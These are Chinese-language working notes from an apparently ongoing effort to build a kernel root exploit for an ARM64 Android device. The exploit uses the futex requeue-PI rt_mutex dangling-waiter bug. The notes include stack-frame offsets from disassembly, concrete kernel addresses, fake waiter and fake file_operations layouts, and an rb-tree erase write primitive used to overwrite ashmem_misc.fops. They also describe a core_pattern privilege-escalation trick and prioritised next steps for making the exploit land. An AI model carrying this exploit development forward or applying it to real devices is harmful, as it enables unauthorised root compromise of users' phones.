| `stamp_futex` | `FUTEX_LOCK_PI/UNLOCK_PI/WAIT_REQUEUE_PI/CMP_REQUEUE_PI` | `rt_waiter` 等 |

原文：「`clone`/`setsockopt`/`pselect`/`keyctl` and other syscalls with large
controlled stack locals work the same way. `prctl` is just convenient here.」

**两个决定性差别（这才是我们失败的根因）：**

1. **不是「一次阻塞调用」，而是 `for (i=0; i<ROUNDS(300); i++) stamp_one(buf)` 反复涂**，
   consumer 在 `stamp_ready` 后立刻 `sched_setattr`，**与涂写循环竞态**。
   我们只做一次阻塞 `sendmsg`，命中窗口窄得多。
2. **用 memfd + `fallocate(PUNCH_HOLE)` 拉伸 `copy_from_user` 窗口**：
   auxv 放在 `shmem_map + PAGE_SIZE - 29*8`（跨页），兄弟线程对尾页反复 punch hole，
   使拷贝变慢/出错，从而把伪造 waiter **留在栈上**。
   我们完全没有这个窗口拉伸机制。

#### (4) 写原语与目标选择（可借鉴）

- 伪 waiter：`task = &init_task`（**合法 task_struct**，保证链走解引用安全）、
  `lock = &inet6_protos[IPPROTO_UDP] - 8`、`wake_state = 0`。
- 只走 `rt_mutex_dequeue()`（rb-tree erase）⇒ **一次受限指针写**
  `*(uint64_t *)target = W0_BASE`。
- 目标邻居必须天然满足：
  ```
  *(u32 *)(target - 0x08) == 0          // 未加锁 spinlock
  *(u64 *)(target + 0x08) == 0          // rb_leftmost
  ((*(u64 *)(target + 0x10)) & ~1) == 0 // owner
  ```
  这与我们 §15.11 的约束表是同一类约束。
- 提权：`inet6_protos[IPPROTO_UDP] = CEA 地址` → loopback IPv6 UDP 触发 CFH →
  pivot → DirtyMode 翻转 `coredump_sysctls[1].mode` 使 `core_pattern` 全局可写 →
  用户态写 `|/proc/%P/fd/666 %P` 完成 LPE。
  **注意：CEA（CPU entry area）是 x86 独有，ARM64 不可移植**；
  但「栈帧回收 + rb-tree erase 写原语」两段是可移植的。

#### (5) 本机可用性核查（2026-10-01，`/proc/config.gz`）

```
CONFIG_CROSS_MEMORY_ATTACH=y
# CONFIG_CHECKPOINT_RESTORE is not set     ← prctl(PR_SET_MM_MAP) 不可用！
CONFIG_FUTEX_PI=y
CONFIG_RT_MUTEXES=y
CONFIG_KEYS=y
```

⇒ **`prctl(PR_SET_MM_MAP)` 在本机被编译裁掉了**（`kernel/sys.c` 里整个函数都在
`#ifdef CONFIG_CHECKPOINT_RESTORE` 内）。**可用的替代**：

- **`pselect6`**（`stack_fds`，约 192 B）—— **我们已有 `IONSTACK_PSELECT_*` 路由；且 §13
  判它「作废」很可能正是因为当时也没走 -EDEADLK 路径，而不是 pselect 本身不行。**
- **`process_vm_readv/writev`**（`CONFIG_CROSS_MEMORY_ATTACH=y`）
- **`keyctl`**（`CONFIG_KEYS=y`）

#### (6) 修正后的行动计划（按优先级）

1. **先修触发路径**：让 `FUTEX_CMP_REQUEUE_PI` 真的返回 **-EDEADLK**
   （当前是 EAGAIN），并把 W 的退出方式从「8 s 超时 ETIMEDOUT」改成
   「被 -EDEADLK rollback 唤醒」。这一步不修，后面涂什么都没用。
2. **把 `sendmsg` 换成 `pselect6`**（已有路由）或 `process_vm_readv`。
3. **改成 `ROUNDS=300` 反复涂 + consumer 竞态**，并补上 memfd + `PUNCH_HOLE` 窗口拉伸。
4. 保留 `IONSTACK_PAINT_PRIO` / `PAINT_FILL` 作为唯一的「是否落地」判据。

---

### 15.18 更正 G：§15.17(2) 的「触发路径没走通」是误判；几何第 4 次独立复核仍然正确

#### (1) `errno=35` 是 `EDEADLK`，不是 `EAGAIN`（§15.17(2) 作废）

之前按 **BSD/macOS** 的 errno 编号读日志（`EAGAIN=35`），得出了错误结论。
本内核头文件里的事实：

```
include/uapi/asm-generic/errno-base.h:15:  #define EAGAIN   11
include/uapi/asm-generic/errno.h:7:        #define EDEADLK  35
```

⇒ `[*] requeue ret=-1 errno=35` **就是 `-EDEADLK`**，即 `rt_mutex_start_proxy_lock()`
的 buggy rollback 路径**已经走通**，与公开 PoC 完全一致。
**§15.17(2) 那条「差异」不存在，行动计划第 1 条（修触发路径）取消。**
同理 W 的 `errno=110`（`ETIMEDOUT`）也是公开 PoC 的预期行为（它同样用 50 ms 超时）。

#### (2) 探针本身有效：`rt_mutex_waiter_equal()` 不解引用 `task`

`kernel/locking/rtmutex.c:252-269` 逐字：

```c
static inline int
rt_mutex_waiter_equal(struct rt_mutex_waiter *left, struct rt_mutex_waiter *right)
{
	if (left->prio != right->prio)
		return 0;
	if (dl_prio(left->prio))
		return left->deadline == right->deadline;
	return 1;
}
```

只读 `prio` / `deadline`，**不碰 `left->task`**。而 `rt_mutex_adjust_pi()`（rtmutex.c:1126-1147）
在 `1135` 行早退：

```c
	waiter = task->pi_blocked_on;
	if (!waiter || rt_mutex_waiter_equal(waiter, task_to_waiter(task))) {
		raw_spin_unlock_irqrestore(&task->pi_lock, flags);
		return;                 /* ← 在 1139 next_lock = waiter->lock 之前 */
	}
	next_lock = waiter->lock;
```

⇒ 把涂抹的 `prio` 写成 `139`（= `120 + consumer nice 19`）就能让设备**存活**；
未命中才会在 `rtmutex.c:585` 的 `raw_spin_trylock(垃圾)` 上 panic。
**§15.16(4) 的判据成立，三次崩溃的结论（涂写未落地）可信。**

#### (3) 几何第 4 次独立复核（反汇编，逐条实测）

| 项 | 指令 / 证据 | 相对 `E`（syscall 入口 SP） |
|---|---|---|
| `__arm64_sys_futex` 帧 | `sub sp, sp, #0x70` | 入口 `E-0x70` |
| `do_futex` 帧 | `sub sp, sp, #0x1e0` | `E-0x250` |
| **`rt_waiter`** | `add x0, sp, #0xc0` → `bl rt_mutex_init_waiter`；<br>`add x25, sp, #0xc0`，随后 `stp x25, x27, [sp,#0xa0]`（写入 `q.rt_waiter`） | **`E-0x190`** |
| `__arm64_sys_sendmsg` 帧 | `sub sp, sp, #0x90`；`mov x2, sp` ⇒ `msg_sys = E-0x90` | `E-0x90` |
| `___sys_sendmsg` 帧 | `sub sp, sp, #0x190`，`x29 = sp+0x140` | `E-0x220` |
| **`address`**（sockaddr_storage） | `sub x10, x29, #0x88`（=`sp+0xB8`）→ `str x10, [x2]` ⇒ `msg_sys->msg_name = &address` | **`E-0x168`** |

⇒ **`address = rt_waiter + 0x28`**（与 §15.2/§15.16(3) 完全一致，第 4 次确认）。
于是载荷布局也对：`address+0x10 = waiter->lock@0x38`、`address+0x18 = waiter->prio@0x40`。
`address` 覆盖 `[rt_waiter+0x28, rt_waiter+0xA8]`，**`prio@0x40` 确实在涂抹范围内**。

> 注：本次绝对值（`E-0x190` / `E-0x168`）与 §15.16(3) 记的（`E-0x198` / `E-0x170`）
> 相差 8 字节，是 `E` 的基准约定不同（是否含 `el0_svc_handler` 的 `stp x0,x1` 槽）；
> **两者差值同为 `0x28`，不影响任何结论。**

#### (4) 因此：涂写未落地的根因只能在这几条里

几何、触发路径、载荷布局、探针判据**全部核对无误**，却仍然三次崩溃。剩下的可能：

1. **`W->pi_blocked_on` 并未指向 `do_futex` 帧里的 `rt_waiter`。**
   `remove_waiter()` 清的是 `current`（= 发起 requeue 的线程 **R**），漏掉 `waiter->task`（= **W**）；
   但如果 `rt_mutex_start_proxy_lock()` 的失败发生在
   `task_blocks_on_rt_mutex()` 设置 `pi_blocked_on` **之前**，就压根没有悬垂指针，
   `sched_setattr` 会在 `!waiter` 处早退 —— 那也不会崩。故此项需实测排除。
2. **崩溃点根本不在 `rt_mutex_adjust_pi()`**：可能在 `fops.c` 既有开火路径、
   `sock_alloc_send_pskb()` 的阻塞路径，或 `IONSTACK_REARM_FIRE=sched` 之外的地方。
3. **涂写落地了，但被后续内核代码再次覆盖**（`do_notify_resume` 之后仍有写入者）。

**在没有可信崩溃栈之前，这三条无法区分** —— 这正是 §15.16(2) 说的「取证通道已死」的代价。

#### (5) 下一步（重排优先级）

1. **恢复可观测性**（最高优先级）：`pstore`/`kmsg` 对 `uid 2000` 全部 `EACCES`；
   需另找通道（ramoops 预留区、`/data/log`、SELinux 域切换），**否则每轮都是盲跑**。
2. 车辆切换：`prctl` 不可用（`CONFIG_CHECKPOINT_RESTORE` 未开），改用
   **`pselect6`**（已有 `IONSTACK_PSELECT_*` 路由）或 **`process_vm_readv`**
   （`CONFIG_CROSS_MEMORY_ATTACH=y`）。
3. 策略切换：由「一次阻塞调用」改为 **反复涂（ROUNDS=300）+ consumer 竞态**，
   并用 memfd + `fallocate(PUNCH_HOLE)` **拉伸 `copy_from_user` 窗口**。
4. 保留 `IONSTACK_PAINT_PRIO` / `PAINT_FILL` 判据。

---

### 15.19 更正 H：§15.16(5) 的结论**读反了**；三次 paint 崩溃是「涂写已落地」的证据

> 完整分析见 **`docs/PAINT_ORACLE_ANALYSIS.md`**（本轮新建）。本节只列更正项与结论。

#### (1) 探针取值算错了 1 ⇒ 三次崩溃不含信息

门的条件（rtmutex.c:1134-1139）就是 **`waiter->prio == W->prio`**（`rt_mutex_waiter_equal()` 非 DL 时只比 `prio`）。

| 量 | 值 | 依据 |
|---|---|---|
| `waiter->prio`（残余） | **120** | rtmutex.c:957 写入 `W->prio`；而 **M 先停靠在 `f_pi_chain` 上**把 W clamp 到 120 |
| `W->prio`（fire 时刻） | **120** | `sched_setattr_tid()` 走 flip 分支（`IONSTACK_CONSUMER_REAL_NICE` 未设）⇒ `sched_nice = 0` ⇒ `normal_prio = 120`，再 `rt_effective_prio = min(120, W->pi_top_task(=M)->prio = 120) = 120` |

**PoC 自己的代码已经写下了「clamped 120」**（`main.c:1531-1544`，`want = 120 - 100 = 20`），
而 `main.c:631` 与 `run_paint.sh` 的探针却用 **121**（`paintprobe139` / `paintfill139` 用 **139**）。

⇒ `PAINT_PRIO ∈ {121, 139} ≠ 120` ⇒ **门必然打开** ⇒ 链走 ⇒ `579 lock = fake_lock` ⇒ `585` ⇒ **必崩**。
⇒ **三次崩溃与「涂写是否落地」无关，§15.16(5) 的推理作废。**

#### (2) 读法反了：崩溃 = 落地，存活 = 未落地

| 实际情形 | `waiter->prio` | `W->prio` | 门 | 现象 |
|---|---|---|---|---|
| 涂写**落地** | 121（涂的） | 120 | **开** | 链走 ⇒ `585` ⇒ **崩** |
| 涂写**未落地** | **120（内核写的残余值）** | 120 | **关** | 1135 早退 ⇒ **存活** |

§15.16(4) 的「未命中 ⇒ `prio` 是栈垃圾 ⇒ panic」**是错的** —— 残余 waiter 的 `prio` 是 rtmutex.c:957 写入的 **120**，不是栈垃圾。

#### (3) 更硬：**「存活/崩溃」在原理上不可能当判据**

残余 waiter 是**完全自洽**的（`prio` 120 == 120；`lock` = 合法 `&P->pi_mutex`，`P` 被 `pi_state_cache` 保住）
⇒ **未涂写状态在本内核上不可能崩**；而涂写落地且 `prio == 120` 时也不崩。
⇒ 必须改用**用户态可见的副作用**：把 `fake_lock` 指向用户可读页的内核线性映射别名，
链走在 `585` 的 `raw_spin_trylock`（CAS `0 → 1`）会改 `*(u32 *)fake_lock`，**用户态直接读回**即为铁证，无需任何 dump。

#### (4) 补上此前缺失的一环：W 的退出路径**绕过了 cleanup**

`futex_wait_requeue_pi()`（futex.c:3296-3302）：

```c
3299	ret = handle_early_requeue_pi_wakeup(hb, &q, &key2, to);
3301	if (ret)
3302		goto out_put_keys;          /* ← 直接返回，3343/3346 都不执行 */
```

`-EDEADLK` 时 R 在 futex.c:2171-2187 走 `else if (ret) { this->pi_state = NULL; put_pi_state(); break; }`，
**`requeue_futex()`（2189）没执行** ⇒ W 的 `futex_q.key` 仍是 `key1 ≠ key2`
⇒ `handle_early_requeue_pi_wakeup()` 必然返回 `-ETIMEDOUT`（futex.c:3173-3188，**只动 `q`，不碰 `pi_blocked_on`**）
⇒ `goto out_put_keys` ⇒ **`rt_mutex_wait_proxy_lock()` / `rt_mutex_cleanup_proxy_lock()` 全不执行**。

而 `rt_mutex_cleanup_proxy_lock()` 是唯一能在 W 自己上下文里清 `pi_blocked_on` 的地方（1911-1914 调 `remove_waiter`，此时 `current == W`）。

⇒ **`W->pi_blocked_on` 悬垂成立，且无自愈路径。§15.18(4) 第 1 条怀疑排除。**

#### (5) 残余 waiter 的完整状态（反汇编实测）

`remove_waiter @ 0xffffff8008148d74`：

| 地址 | 指令 | 含义 |
|---|---|---|
| `0x8148da8` | `mrs x20, SP_EL0` | `x20 = current` = **R** |
| `0x8148dac` | `add x21, x20, #0x8c8` | `&R->pi_lock` |
| `0x8148dc8/0x8148dd0` | `bl rb_erase_cached` | 仅当 `!RB_EMPTY_NODE` |
| `0x8148dd4` | `str x23, [x23]` | `RB_CLEAR_NODE(&waiter->tree_entry)` ⇒ `__rb_parent_color = &waiter`（**W 的栈地址**） |
| **`0x8148ddc`** | **`str xzr, [x20, #0x8f8]`** | **`current->pi_blocked_on = NULL`（清的是 R）** |

★ **由此得到写原语的硬约束**：`remove_waiter` 已把 `tree_entry` 设为 `RB_CLEAR_NODE`
⇒ 之后 `rt_mutex_dequeue()`（rtmutex.c:294-301）的 `if (RB_EMPTY_NODE(...)) return;` **必然早退**
⇒ **`rb_erase`（664）那条写原语是死的**，唯一活着的是 **`rt_mutex_enqueue()`（685）→ `rb_insert_color_cached()` → `__rb_insert()` Case 3**。
⚠️ 且 685 要求 `lock->waiters` **非空**，否则 `parent == NULL` 时 `__rb_insert()` 立刻 `return`，**一个字节都不写** —— 这正是 `IONSTACK_FOPS_PI_RB_SHAPE=rbinsert` 的用途。

#### (6) 落地之后为什么还崩：`rt_mutex_adjust_prio` 走的是 MIN_CHAINWALK

`requeue` 初值 `true`（rtmutex.c:460），`detect_deadlock = false`（462，因 `orig_waiter = NULL`）
⇒ 552-570 的两个分支都 `goto out_unlock_pi`，**不会**把 `requeue` 置 false
⇒ **链走确实会走到 664/685/723-725** ✓（原计划成立）。

**安全出口在 rtmutex.c:600**：`if (lock == orig_lock || rt_mutex_owner(lock) == top_task)`
（`orig_lock = NULL`、`top_task = W`）⇒ **只要 `rt_mutex_owner(fake_lock) == W`，链走就在 600 安全退出。**

当前 `IONSTACK_FOPS_LOCK_OWNER_MODE=fake-task` ⇒ `owner = fake_task ≠ W` ⇒ 继续走 698-716，
⇒ `fake_task` 必须是自洽 `task_struct`（`usage@0x68`、`pi_lock@0x8c8`、`pi_top_task@0x8f0`、`pi_blocked_on@0x8f8`、`dl.deadline@0x430`）。

#### (7) 本轮行动项（重排）

1. **`IONSTACK_PAINT_PRIO=120`**（保持 `IONSTACK_CONSUMER_REAL_NICE` 未设）⇒ 预测存活，消掉假异常。
   ⚠️ 这条**不能**证明涂写落地（落地 120 与未落地 120 同效）。
2. **换判据**：`fake_lock` 指向用户可读页的内核线性映射别名，读 `*(u32 *)fake_lock` 的 `0 → 1`（§(3)）。
3. **修 `PAINT_FILL` 语义**：填 0x80 后**末尾 8 字节强制回写合法 `lock`**（否则一旦落地必崩，永远无信息）。
4. **新增 `IONSTACK_FOPS_LOCK_OWNER_MODE=owner-is-W`**：`*(u64 *)(fake_lock+0x20) = W_task` ⇒ 链走在 600 安全退出 ⇒ 永不崩溃的双向可判构型。
5. **W 在「futex 返回 → paint」之间的 `pr_*` 全部挪到 paint 之后**（`main.c:764`、`main.c:672`）。`fops.c:396-404` 已记录 `write()` 二次覆盖会毁掉 paint（pselect 路线正是死在这里：`waiter->lock` 读回 `0x6e`）。
6. 写原语只押 685（见 (5)）。
7. `write` 路线已排除：`__arm64_sys_write 0x10` / `ksys_write 0x40` / `vfs_write 0x40` / `__vfs_write 0xa0` / `pipe_write 0xb0` / `n_tty_write 0xa0`，**到不了 `E-0x190`**。

#### (8) 待统一的数字

| 位置 | 现状 | 应改为 |
|---|---|---|
| §15.16(3) | `rt_waiter = E-0x198`、`address = E-0x170` | `E-0x190` / `E-0x168`（`E` 基准差 8B，差值同为 `0x28`） |
| §3.5.2 | 行内「`0x90 = 16`」与文字「= 16」矛盾（`0x90 = 18`） | 算术笔误；以 `offset.h` 的 `shift=16` 与 §15.18(3) 为准 |
| §15.16(4) | 探针目标 139 | 仅 `IONSTACK_CONSUMER_REAL_NICE=1` 时成立；默认下是 **120** |
| §15.16(5) | 「全部崩溃 ⇒ 涂写未落地」 | **反的**（见 (2)） |
| `main.c:631` | 「121 for a nice=1 CFS task」 | **120**（与同文件 1534 行 "clamped 120" 一致） |
| `util.c:1054-1058` | 「nice 0 -> prio 120」 | 与 `IONSTACK_W_NICE=1` 冲突；实为「M 停靠后 clamp 到 120」 |

#### (9) 工具坑（本轮踩到）

- **`grep` 读 `objdump` 输出必须加 `-a`**，否则被当二进制**静默返回空**（本轮 `vfs_write`/`ksys_write`/`__arm64_sys_sendmsg` 的 `bl` 搜索全因此为空）。
- `objdump --disassemble-symbols=` **不加前导下划线**。

---

## 16. 全链闭环（权威版：`docs/ROOT_CHAIN_THEORY.md`）

> **本节只做指针，不重复内容。** 完整论证见同目录 **`ROOT_CHAIN_THEORY.md`**。

### 16.1 一句话

整条提权链只有 **5 环**，**环 2/3/4 的代码本仓库早就写好了**（`util.c` 的假 fops +
configfs 读写、`pipe.c` 的 pipe_buffer 劫持、`root.c` 的 cred 改写），
**唯一缺环是环 1 的那一笔写**：

```c
*(uint64_t *)data_addr(ASHMEM_MISC_FOPS) = fake_fops;
```

### 16.2 对本文件 §12.5 / §15.19 的两处**修正**

| 位置 | 旧说法 | 修正 |
|---|---|---|
| §12.5 | 给出「插入侧 Case 3」与「`ghostlock-right`」两条候选 | **两条都不能用**。① 插入侧 Case 3 的前置是 `*(TARGET-0x10) == 0`，而设备二进制实测 `ashmem_misc.minor = 0xff ≠ 0` ⇒ 打不到 `ashmem_misc.fops`，只能做自页自检；② `ghostlock-right` 走 `rb_erase` 的 **Case 1**，`pc` 被钉死在 `ASHMEM_MISC_FOPS - 0x08`，而 `pc` 又是 `child->__rb_parent_color` 的写值 ⇒ **`fake_fops->owner` 被涂成非 0** ⇒ `fops_get()` → `try_module_get()` 的 `module->refcnt @ +0x318` 落在 `abc_hub_driver.driver.acpi_match_table`（静态零初始化）⇒ **必败** ⇒ `open("/dev/ashmem")` = `-ENODEV`。**正解是 `rb_erase` 的 Case 1 变体，形状名 `target-left`**（`rb_right = child`、`rb_left = 0`、`pc` 自由） |
| §15.19(5) | 「`rb_erase`(664) 那条路是死的，唯一活着的是 685」 | 措辞不准：**死的只是「栈上残余 waiter 的 `tree_entry`」**；**我们自己页里 `fake_w0->pi_tree_entry` 的 `rb_erase`（723）完全活着**，而且前置最弱（只要 `*(TARGET+0x08) != node`），**它才是环 1 的正路** |
| §15.16(3) | `rt_waiter = E-0x198`、`address = E-0x170` | `E-0x190` / `E-0x168`（`E` 基准约定差 8B，差值同为 `0x28`，结论不变） |
| §15.16(5) | 「三种配置全部崩溃 ⇒ 涂写没有落地」 | **读反了**（已由 §15.19 更正）。崩溃 = 落地；存活 = 未落地 |

### 16.3 二进制实测事实（新增）

```
ffffff800b38d188 l O .kernel2  ashmem_misc
  +0x00 = ff 00 00 00 00 00 00 00        ⇒ minor = 0xff (MISC_DYNAMIC_MINOR = 255)
  minor@0x00, name@0x08, fops@0x10, list@0x18
⇒ ASHMEM_MISC_FOPS = ashmem_misc + 0x10 = 0xffffff800b38d198
⇒ data_addr(ASHMEM_MISC_FOPS) = 0xffffffc00338d198   （与 util.c:2289 的 live-vetted 一致 ✓）
```

### 16.4 环 1 的写语义（`rtmutex.c:723`，形状 `target-left`）

`rb_erase_cached(&fake_w0->pi_tree_entry, &fake_task->pi_waiters)`，走
`__rb_erase_augmented()` 的 **Case 1 变体**（`rbtree_augmented.h:193-199`，`!child`）：

```
node  = &fake_w0->pi_tree_entry
  node->__rb_parent_color (= write_pc)    = fake_fops          ← 写值 pc，同时决定 parent
  node->rb_right          (= write_right) = data_addr(ASHMEM_MISC_FOPS)   ← child
  node->rb_left           (= write_left)  = 0                  ← tmp == 0 ⇒ 跳过 Case 1，落到 !child
```

执行：

```c
tmp = node->rb_right;            /* = data_addr(ASHMEM_MISC_FOPS) ≠ 0 ⇒ 不进 176 的 Case 1 */
if (!child) {                    /* child = node->rb_left == 0 ⇒ 进 */
	pc = node->__rb_parent_color;                 /* = fake_fops */
	parent = __rb_parent(pc);                     /* = fake_fops & ~3 = fake_fops */
	tmp->__rb_parent_color = pc;                  /* *(child + 0x00) = fake_fops  ← 环 1 的那一笔写 */
	__rb_change_child(node, tmp, parent, root);
	...
}
```

`__rb_change_child(node, tmp, parent, root)`（`rbtree_augmented.h:134-145`）比较的是
`parent->rb_left == node`：

- `parent + 0x10` = `fake_fops + FOPS_READ_OFF` = `read` 槽 = `text_addr(CONFIGFS_READ_FILE)` ≠ `node`
- ⇒ **else** ⇒ `WRITE_ONCE(parent->rb_right, tmp)` ⇒ **`*(fake_fops + 0x08) = data_addr(ASHMEM_MISC_FOPS)`**
  （只打掉 `llseek`，随后由 `repair_fake_fops_llseek()` 改成 `NOOP_LLSEEK`）

**两笔写都留在我们页里，`fake_fops->owner` 一动不动**（`owner` 只会在 `pc` 被钉死时被打，
而这里 `pc = fake_fops` 是我们的地址，`parent = fake_fops` 也在我们页里）。

⇒ `fops_get()` 看到 `owner == 0` 直接返回 `fake_fops`，**连 `try_module_get()` 都不进**。

> 为什么 `pc` 低位必须为 0（`parent = pc & ~3` 必须落在 `fake_fops` 上）：
> `fake_fops` 是页对齐地址 + `FOPS_OFF = 0x1000`，天然满足。
> 若 `pc = fake_fops | 1`（BLACK），`parent` 会变成 `fake_fops`，但
> `child->__rb_parent_color = pc` 会把 token 链打断（红黑树的 `__rb_parent_color`
> 低位是颜色位，`& ~3` 之后才取 parent）—— 这里 `child` 是 `ashmem_misc.fops` 槽，
> 不参与任何树，所以颜色位无所谓，但保持 0 更安全。

### 16.5 已用二进制证明的前提（不再是待验证项）

1. `try_module_get()`（`0xffffff8008196f44`）反汇编：
   `ldr w8,[x0]` 比较 `module->state @ +0x00`、`ldr w8,[x19,#0x318]` 要求
   `module->refcnt @ +0x318` 非 0。
2. `*(ASHMEM_MISC_FOPS + 0x310)` = `ashmem_misc + 0x320`
   = `abc_hub_driver.driver.acpi_match_table`
   （`objdump -t`：`abc_hub_driver` @ `0xffffff800b38d450`；`platform_driver.driver` @ `+0x28`，
   `device_driver.acpi_match_table` @ `+0x30` ⇒ `+0x58`；`0x320 - 0x2c8 = 0x58` ✓）
   ⇒ **静态零初始化，恒为 0**。
   ⇒ **`ghostlock-right` 那条路必然让 `open("/dev/ashmem")` 返回 `-ENODEV`。**
3. 环 1 之后的判据（用户态可见，不需要 dump、不需要崩溃）：
   `open("/dev/ashmem")` + `configfs_read_once(fd, data_addr(ASHMEM_MISC_FOPS), &v, 8)`
   要求 `v == fake_fops`（与 `fops.c:3349-3355` 同一测试，已实现为 `verify_paint_gate()`
   的 `ring1-read` 分支）。

### 16.6 时序硬约束（W 侧零 syscall）

W 从 `FUTEX_WAIT_REQUEUE_PI` 返回后、进入阻塞 `sendmsg` 之前**不得有任何 syscall**。
`llvm-objdump` 实测 `__arm64_sys_write 0x10 / ksys_write 0x40 / vfs_write 0x40 /
__vfs_write 0xa0 / pipe_write 0xb0` ⇒ `pipe_write` 的 `sp = SP0-0x1e0`，其序言
`stp x29,x16,[sp,#0x50]` … `stp x20,x19,[sp,#0xa0]` 恰好覆盖
`waiter+0x00..waiter+0x58`（waiter = `SP0-0x190`），而 `sendmsg` 的 `address` 拷贝
只重涂 `waiter+0x28..0x50` ⇒ 残余 `RB_CLEAR_NODE`（`rtmutex.c:664` 的早退依据）被毁。
W 侧两条 `pr_*` 已改成「发布到全局 / atomic，由 R 打印」。


